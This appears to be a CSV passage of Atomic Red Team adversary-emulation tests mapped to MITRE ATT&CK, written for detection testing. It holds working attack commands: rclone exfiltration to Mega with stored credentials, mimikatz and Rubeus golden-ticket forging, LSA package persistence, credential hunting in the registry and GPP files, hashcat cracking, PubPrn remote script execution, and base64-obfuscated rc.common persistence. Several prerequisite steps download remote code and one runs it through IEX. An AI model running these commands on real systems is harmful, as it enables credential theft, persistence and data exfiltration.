",windows,,,"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }
Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore
",powershell,True,,"Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore
",,,
T1070.008,Email Collection: Mailbox Manipulation,Copy and Delete Mailbox Data on Linux,25e2be0e-96f7-4417-bd16-a4a2500e3802,"Copies and deletes mail data on Linux
",linux,,,"mkdir -p /var/spool/mail/copy
for file in /var/spool/mail/*; do
  if [ ""$(basename ""$file"")"" != ""copy"" ]
  then
    cp -R ""$file"" /var/spool/mail/copy/
  fi
done
rm -rf /var/spool/mail/copy/*
",bash,True,,"rm -rf /var/spool/mail/copy
",,,
T1070.008,Email Collection: Mailbox Manipulation,Copy and Delete Mailbox Data on macOS,3824130e-a6e4-4528-8091-3a52eeb540f6,"Copies and deletes mail data on macOS
",macos,,,"mkdir ~/Library/Mail/copy
cp -R ~/Library/Mail/* ~/Library/Mail/copy
rm -rf ~/Library/Mail/copy/*
",bash,True,,"rm -rf ~/Library/Mail/copy
",,,
T1070.008,Email Collection: Mailbox Manipulation,Copy and Modify Mailbox Data on Windows,edddff85-fee0-499d-9501-7d4d2892e79b,"Copies and modifies mail data on Windows
",windows,,,"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -File | ForEach-Object { Add-Content -Path $_.FullName -Value ""Modification for Atomic Red Test"" -ErrorAction Ignore }
",powershell,True,,"Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore
",,,
T1070.008,Email Collection: Mailbox Manipulation,Copy and Modify Mailbox Data on Linux,6d99f93c-da56-49e3-b195-163090ace4f6,"Copies and modifies mail data on Linux
",linux,,,"mkdir -p /var/spool/mail/copy
for file in /var/spool/mail/*; do
  if [ ""$(basename ""$file"")"" != ""copy"" ]
  then
    cp -R ""$file"" /var/spool/mail/copy/
    if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then
      echo ""Modification for Atomic Red Test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""
    fi
  fi
done
",bash,True,,"rm -rf /var/spool/mail/copy
",,,
T1070.008,Email Collection: Mailbox Manipulation,Copy and Modify Mailbox Data on macOS,8a0b1579-5a36-483a-9cde-0236983e1665,"Copies and modifies mail data on macOS
",macos,,,"mkdir ~/Library/Mail/copy
cp -R ~/Library/Mail/* ~/Library/Mail/copy
echo ""Manipulated data"" > ~/Library/Mail/copy/manipulated.txt
",bash,True,,"rm -rf ~/Library/Mail/copy
",,,
T1567.002,Exfiltration Over Web Service: Exfiltration to Cloud Storage,Exfiltrate data with rclone to cloud Storage - Mega (Windows),8529ee44-279a-4a19-80bf-b846a40dda58,"This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)
See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
",windows,,,"New-Item #{rclone_config_path}\rclone -ItemType directory
New-Item #{rclone_config_path}\rclone\rclone.conf
cd ""#{rclone_path}""
.\rclone.exe config create #{remote_share} mega
set-Content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}""
.\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v
",powershell,False,,"cd ""#{rclone_path}""
.\rclone.exe purge #{remote_share}:test
.\rclone.exe config delete #{remote_share}:
Remove-Item #{rclone_config_path}\rclone -recurse -force -erroraction silentlycontinue
cd c:\
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\rclone.zip""
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\T1567.002"" -recurse -force
",powershell,"dependencies.0.description: rclone must exist at (#{rclone_path})

dependencies.0.prereq_command: if (Test-Path ""#{rclone_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://downloads.rclone.org/rclone-current-windows-amd64.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\rclone.zip""
Expand-archive -path ""PathToAtomicsFolder\..\ExternalPayloads\rclone.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\T1567.002\"" -force

","input_arguments.rclone_path.description: Directory of rclone.exe

input_arguments.rclone_path.type: path

input_arguments.rclone_path.default: PathToAtomicsFolder\..\ExternalPayloads\T1567.002\rclone-v*\

input_arguments.rclone_config_path.description: Path to rclone's config file (default should be fine)

input_arguments.rclone_config_path.type: path

input_arguments.rclone_config_path.default: $env:appdata

input_arguments.dir_to_copy.description: Directory to copy

input_arguments.dir_to_copy.type: string

input_arguments.dir_to_copy.default: PathToAtomicsFolder\..\ExternalPayloads\T1567.002

input_arguments.mega_user_account.description: Mega user account

input_arguments.mega_user_account.type: string

input_arguments.mega_user_account.default: atomictesting@outlook.com

input_arguments.mega_user_password.description: Mega user password

input_arguments.mega_user_password.type: string

input_arguments.mega_user_password.default: vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA

input_arguments.remote_share.description: Remote Mega share

input_arguments.remote_share.type: string

input_arguments.remote_share.default: T1567002

"
T1558.001,Steal or Forge Kerberos Tickets: Golden Ticket,Crafting Active Directory golden tickets with mimikatz,9726592a-dabc-4d4d-81cd-44070008b3af,"Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
",windows,,,"Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = ""#{domain_sid}""
If ($domain_sid -Match ""DEFAULT"") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt"" ""exit""

  echo.
  echo Requesting SYSVOL:
  dir \\#{domain}\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
",powershell,False,,,powershell,"dependencies.0.description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

dependencies.0.prereq_command: $mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

","input_arguments.domain_sid.description: SID of the targeted domain, if you keep default it will automatically get the current domain SID

input_arguments.domain_sid.type: string

input_arguments.domain_sid.default: S-1-5-21-DEFAULT

input_arguments.domain.description: Targeted Active Directory domain FQDN

input_arguments.domain.type: string

input_arguments.domain.default: %userdnsdomain%

input_arguments.account.description: Account to impersonate

input_arguments.account.type: string

input_arguments.account.default: goldenticketfakeuser

input_arguments.krbtgt_aes256_key.description: Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)

input_arguments.krbtgt_aes256_key.type: string

input_arguments.krbtgt_aes256_key.default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9

input_arguments.mimikatz_path.description: Mimikatz windows executable

input_arguments.mimikatz_path.type: path

input_arguments.mimikatz_path.default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe

"
T1558.001,Steal or Forge Kerberos Tickets: Golden Ticket,Crafting Active Directory golden tickets with Rubeus,e42d33cd-205c-4acf-ab59-a9f38f6bad9c,"Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
",windows,,,"Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c ""#{local_folder}\#{local_executable}"" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(""golden_"")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  ""#{local_folder}\#{local_executable}"" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$(#{domaincontroller})\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
",powershell,False,,,powershell,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

dependencies.1.description: Rubeus must exist

dependencies.1.prereq_command: if(Test-Path -Path #{local_folder}\#{local_executable}) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}

","input_arguments.domaincontroller.description: Targeted Active Directory domain FQDN

input_arguments.domaincontroller.type: string

input_arguments.domaincontroller.default: $ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain""

input_arguments.account.description: Account to impersonate

input_arguments.account.type: string

input_arguments.account.default: $ENV:username

input_arguments.krbtgt_aes256_key.description: Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)

input_arguments.krbtgt_aes256_key.type: string

input_arguments.krbtgt_aes256_key.default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9

input_arguments.local_folder.description: Local path of Rubeus executable

input_arguments.local_folder.type: path

input_arguments.local_folder.default: $Env:temp

input_arguments.local_executable.description: name of the rubeus executable

input_arguments.local_executable.type: string

input_arguments.local_executable.default: rubeus.exe

input_arguments.rubeus_url.description: URL of Rubeus executable

input_arguments.rubeus_url.type: url

input_arguments.rubeus_url.default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe

"
T1609,Kubernetes Exec Into Container,ExecIntoContainer,d03bfcd3-ed87-49c8-8880-44bb772dea4b,"Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (“kubectl exec”). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using “kubectl exec”.
",containers,,,"kubectl create -f #{path} -n #{namespace}
# wait 3 seconds for the instance to come up
sleep 3
kubectl exec -n #{namespace} busybox -- #{command}
",bash,False,,"kubectl delete pod busybox -n #{namespace}
",,"dependencies.0.description: kubectl must be installed

dependencies.0.get_prereq_command: echo ""kubectl must be installed manually""

dependencies.0.prereq_command: which kubectl

","input_arguments.namespace.description: K8s namespace to use

input_arguments.namespace.type: string

input_arguments.namespace.default: default

input_arguments.command.description: Command to run

input_arguments.command.type: string

input_arguments.command.default: uname

input_arguments.path.description: Path to busybox.yaml file

input_arguments.path.type: string

input_arguments.path.default: $PathtoAtomicsFolder/T1609/src/busybox.yaml

"
T1609,Kubernetes Exec Into Container,Docker Exec Into Container,900e2c49-221b-42ec-ae3c-4717e41e6219,"Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (“docker exec”). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using “docker exec”. Kinsing (Golang-based malware) was executed with an Ubuntu container entry point that runs shell scripts.
",containers,,,"docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ 
docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh
docker exec -i t1609_container bash -c ""cat /tmp/output.txt""
",bash,False,,"docker stop t1609_container
docker rmi -f t1609:latest 
",,"dependencies.0.description: docker must be installed

dependencies.0.get_prereq_command: if [ """" == ""`which docker`"" ]; then echo ""Docker Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install docker ; elif [ -n ""`which yum`"" ]; then sudo yum -y install docker ; fi ; else echo ""Docker installed""; fi

dependencies.0.prereq_command: which docker

",
T1547.002,Authentication Package,Authentication Package,be2590e8-4ac3-47ac-b4b5-945820f2fbe9,"Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
After a reboot, Notepad.exe will be executed as child process of lsass.exe.
Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)
",windows,,,"Copy-Item ""$PathToAtomicsFolder\T1547.002\bin\package.dll"" C:\Windows\System32\
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f
",powershell,True,,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0"" /f
rm -force C:\windows\system32\package.dll
",,,
T1552.002,Unsecured Credentials: Credentials in Registry,Enumeration for Credentials in Registry,b6ec082c-7384-46b3-a111-9a9b8b14e5e7,"Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word ""password"" will be displayed.
",windows,,,"reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
",command_prompt,,,,,,
T1552.002,Unsecured Credentials: Credentials in Registry,Enumeration for PuTTY Credentials in Registry,af197fd7-e868-448e-9bd5-05d1bcd9d9e5,"Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry
entries are found, they will be displayed.
",windows,,,"reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
",command_prompt,,,,,,
T1110.002,Brute Force: Password Cracking,Password Cracking with Hashcat,6d27df5d-69d4-4c91-bc33-5983ffe91692,Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against,windows,,,"cd #{hashcat_exe}\..
#{hashcat_exe} -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}",command_prompt,True,,"del ""PathToAtomicsFolder\..\ExternalPayloads\hashcat6.7z"" >nul 2>&1
del ""PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe"" >nul 2>&1
del ""PathToAtomicsFolder\..\ExternalPayloads\7z"" /Q /S >nul 2>&1
del ""PathToAtomicsFolder\..\ExternalPayloads\hashcat-unzip"" /Q /S >nul 2>&1",powershell,"dependencies.0.description: Hashcat must exist on disk at specified location (#{hashcat_exe})
dependencies.0.prereq_command: if (Test-Path  $(cmd /c echo ""#{hashcat_exe}"")) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://www.7-zip.org/a/7z1900.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe""
Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe"" -ArgumentList ""/S /D=PathToAtomicsFolder\..\ExternalPayloads\7zi"" -NoNewWindow
Invoke-WebRequest ""https://hashcat.net/files/hashcat-6.1.1.7z"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\hashcat6.7z""
Start-Process cmd.exe -Args  ""/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip"" -Wait
New-Item -ItemType Directory (Split-Path $(cmd /c echo #{hashcat_exe})) -Force | Out-Null
Move-Item ""PathToAtomicsFolder\..\ExternalPayloads\hashcat-unzip\hashcat-6.1.1\*"" $(cmd /c echo #{hashcat_exe}\..) -Force -ErrorAction Ignore
","input_arguments.hashcat_exe.description: Path to Hashcat executable

input_arguments.hashcat_exe.type: string

input_arguments.hashcat_exe.default: PathToAtomicsFolder\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe

input_arguments.input_file_sam.description: Path to SAM file

input_arguments.input_file_sam.type: string

input_arguments.input_file_sam.default: PathToAtomicsFolder\T1110.002\src\sam.txt

input_arguments.input_file_passwords.description: Path to password list

input_arguments.input_file_passwords.type: string

input_arguments.input_file_passwords.default: PathToAtomicsFolder\T1110.002\src\password.lst

"
T1113,Screen Capture,Screencapture,0f47ceb1-720f-4275-96b8-21f0562217ac,"Use screencapture command to collect a full desktop screenshot
",macos,,,"screencapture #{output_file}
",bash,,,"rm #{output_file}
",,,"input_arguments.output_file.description: Output file path

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1113_desktop.png

"
T1113,Screen Capture,Screencapture (silent),deb7d358-5fbd-4dc4-aecc-ee0054d2d9a4,"Use screencapture command to collect a full desktop screenshot
",macos,,,"screencapture -x #{output_file}
",bash,,,"rm #{output_file}
",,,"input_arguments.output_file.description: Output file path

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1113_desktop.png

"
T1113,Screen Capture,X Windows Capture,8206dd0c-faf6-4d74-ba13-7fbe13dce6ac,"Use xwd command to collect a full desktop screenshot and review file with xwud
",linux,,,"xwd -root -out #{output_file}
xwud -in #{output_file}
",bash,,,"rm #{output_file}
",bash,"dependencies.0.description: Package with XWD and XWUD must exist on device

dependencies.0.prereq_command: if #{package_checker} > /dev/null; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: sudo #{package_installer} 

","input_arguments.output_file.description: Output file path

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1113_desktop.xwd

input_arguments.package_checker.description: Package checking command for linux. Debian system command- dpkg -s x11-apps

input_arguments.package_checker.type: string

input_arguments.package_checker.default: rpm -q xorg-x11-apps

input_arguments.package_installer.description: Package installer command for linux. Debian system command- apt-get install x11-apps

input_arguments.package_installer.type: string

input_arguments.package_installer.default: yum install -y xorg-x11-apps

"
T1113,Screen Capture,X Windows Capture (freebsd),562f3bc2-74e8-46c5-95c7-0e01f9ccc65c,"Use xwd command to collect a full desktop screenshot and review file with xwud
",linux,,,"xwd -root -out #{output_file}
xwud -in #{output_file}
",sh,,,"rm #{output_file}
",sh,"dependencies.0.description: Package with XWD and XWUD must exist on device

dependencies.0.prereq_command: if [ -x ""$(command -v xwd)"" ]; then exit 0; else exit 1; fi
if [ -x ""$(command -v xwud)"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: pkg install -y xwd xwud 

","input_arguments.output_file.description: Output file path

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1113_desktop.xwd

"
T1113,Screen Capture,Capture Linux Desktop using Import Tool,9cd1cccb-91e4-4550-9139-e20a586fcea1,"Use import command from ImageMagick to collect a full desktop screenshot
",linux,,,"import -window root #{output_file}
",bash,,,"rm #{output_file}
",,"dependencies.0.description: ImageMagick must be installed

dependencies.0.prereq_command: if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: sudo apt install graphicsmagick-imagemagick-compat

","input_arguments.output_file.description: Output file path

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1113_desktop.png

"
T1113,Screen Capture,Capture Linux Desktop using Import Tool (freebsd),18397d87-38aa-4443-a098-8a48a8ca5d8d,"Use import command from ImageMagick to collect a full desktop screenshot
",linux,,,"import -window root #{output_file}
",sh,,,"rm #{output_file}
",,"dependencies.0.description: ImageMagick must be installed

dependencies.0.prereq_command: if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: pkg install -y ImageMagick7

","input_arguments.output_file.description: Output file path

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1113_desktop.png

"
T1113,Screen Capture,Windows Screencapture,3c898f62-626c-47d5-aad2-6de873d69153,"Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour
",windows,,,"cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
cmd /c ""timeout #{recording_time} > NULL && psr.exe /stop""
",powershell,False,,"rm #{output_file} -ErrorAction Ignore
",,,"input_arguments.output_file.description: Output file path

input_arguments.output_file.type: path

input_arguments.output_file.default: c:\temp\T1113_desktop.zip

input_arguments.recording_time.description: Time to take screenshots

input_arguments.recording_time.type: integer

input_arguments.recording_time.default: 5

"
T1113,Screen Capture,Windows Screen Capture (CopyFromScreen),e9313014-985a-48ef-80d9-cde604ffc187,"Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.

[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
",windows,,,"Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save(""#{output_file}"")
",powershell,,,"Remove-Item #{output_file} -ErrorAction Ignore
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: $env:TEMP\T1113.png

"
T1552.006,Unsecured Credentials: Group Policy Preferences,GPP Passwords (findstr),870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f,"Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
",windows,,,"findstr /S cpassword %logonserver%\sysvol\*.xml
",command_prompt,,,,powershell,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

",
T1552.006,Unsecured Credentials: Group Policy Preferences,GPP Passwords (Get-GPPPassword),e9584f82-322c-474a-b831-940fd8b4455c,"Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.

Successful test execution will either display the credentials found in the GPP files or indicate ""No preference files found"".
",windows,,,". ""#{gpp_script_path}""
Get-GPPPassword -Verbose
",powershell,,,,powershell,"dependencies.0.description: Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}

dependencies.0.prereq_command: if(Test-Path ""#{gpp_script_path}"") {exit 0 } else {exit 1 }

dependencies.0.get_prereq_command: New-Item -ItemType Directory (Split-Path ""#{gpp_script_path}"") -Force | Out-Null
Invoke-WebRequest #{gpp_script_url} -OutFile ""#{gpp_script_path}""

dependencies.1.description: Computer must be domain joined

dependencies.1.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

","input_arguments.gpp_script_url.description: URL of the Get-GPPPassword PowerShell Script

input_arguments.gpp_script_url.type: url

input_arguments.gpp_script_url.default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1

input_arguments.gpp_script_path.description: Path to the Get-GPPPassword PowerShell Script

input_arguments.gpp_script_path.type: path

input_arguments.gpp_script_path.default: PathToAtomicsFolder\..\ExternalPayloads\Get-GPPPassword.ps1

"
T1216.001,Signed Script Proxy Execution: Pubprn,PubPrn.vbs Signed Script Bypass,9dd29a1f-1e16-4862-be83-913b10a88f6c,"Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.
",windows,,,"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:#{remote_payload}""
",command_prompt,,,,,,"input_arguments.remote_payload.description: A remote payload to execute using PubPrn.vbs.

input_arguments.remote_payload.type: url

input_arguments.remote_payload.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct

"
T1037.004,Boot or Logon Initialization Scripts: Rc.common,rc.common,97a48daa-8bca-4bc0-b1a9-c1d163e762de,"Modify rc.common

[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)
",macos,,,"sudo echo osascript -e 'tell app ""Finder"" to display dialog ""Hello World""' >> /etc/rc.common
",bash,True,,,,,
T1037.004,Boot or Logon Initialization Scripts: Rc.common,rc.common,c33f3d80-5f04-419b-a13a-854d1cbdbf3a,"Modify rc.common
",linux,,,"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"""" | sudo tee -a /etc/rc.common
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
sudo chmod +x /etc/rc.common
",bash,True,,"origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi
",,,
T1037.004,Boot or Logon Initialization Scripts: Rc.common,rc.local,126f71af-e1c9-405c-94ef-26a47b16c102,"Modify rc.local
",linux,,,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
